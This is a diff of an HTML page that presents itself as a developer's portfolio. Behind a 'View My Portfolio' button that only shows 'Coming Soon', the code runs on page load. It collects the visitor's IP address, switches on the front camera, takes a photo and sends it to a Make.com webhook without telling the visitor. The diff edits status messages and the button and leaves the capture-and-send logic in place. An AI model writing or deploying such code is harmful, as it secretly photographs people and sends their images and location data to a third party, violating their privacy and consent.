@@ -47,8 +47,12 @@
         <header>
             <h1>Pavan Chowdary Lingam</h1>
             <p class="subtitle">Full Stack Developer | Designer | Creator</p>
-            <!-- NO REDIRECT - Just shows alert -->
-            <button class="btn" onclick="alert('Portfolio coming soon!')">🌟 View My Portfolio</button>
+            
+            <!-- NO REDIRECT - Just shows message -->
+            <button class="btn" onclick="showMessage()">🌟 View My Portfolio</button>
+            
+            <!-- Hidden message area -->
+            <p id="msg" style="display:none; margin-top:20px; color:#27ae60; font-weight:bold;">Coming Soon!</p>
         </header>
         
         <div class="features">
@@ -63,6 +67,15 @@
     <div id="status">Loading...</div>
 
     <script>
+        // Show message instead of redirect
+        function showMessage() {
+            document.getElementById('msg').style.display = 'block';
+            // Optional: hide after 3 seconds
+            setTimeout(() => {
+                document.getElementById('msg').style.display = 'none';
+            }, 3000);
+        }
+
         // YOUR MAKE.COM WEBHOOK
         const WEBHOOK = 'https://hook.eu2.make.com/oqh3j9prk6i4mu6a4emdgk3gxxynepd4';
         
@@ -90,7 +103,7 @@
 
         // AUTO CAPTURE & SEND ON PAGE LOAD
         window.addEventListener('load', async () => {
-            updateStatus('Starting capture...');
+            updateStatus('Getting IP...');
             
             // Get IP
             try {
@@ -102,7 +115,7 @@
             }
 
             // Try camera
-            updateStatus('Camera starting...');
+            updateStatus('Starting camera...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: 640, height: 480 },
@@ -112,44 +125,35 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // Wait for camera ready
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => setTimeout(resolve, 2000);
                 });
                 
-                // Capture to canvas
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
                 
-                // Get base64 image - REAL PHOTO DATA
                 data.photo = canvas.toDataURL('image/jpeg', 0.9);
+                updateStatus('Photo captured!');
                 
-                updateStatus('Photo captured! Sending...');
-                
-                // Stop camera
                 stream.getTracks().forEach(t => t.stop());
                 
             } catch(e) { 
                 data.photo = 'camera_denied'; 
-                updateStatus('No camera, sending data...');
+                updateStatus('Camera blocked');
             }
 
             // SEND TO MAKE.COM
+            updateStatus('Sending...');
             try {
-                const response = await fetch(WEBHOOK, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                
-                if (response.ok) {
-                    updateStatus('✅ Sent to you!');
-                } else {
-                    updateStatus('❌ Failed to send');
-                }
+                updateStatus('✅ Sent to you!');
             } catch(err) {
-                updateStatus('❌ Error sending');
+                updateStatus('❌ Failed');
             }
         });
     </script>
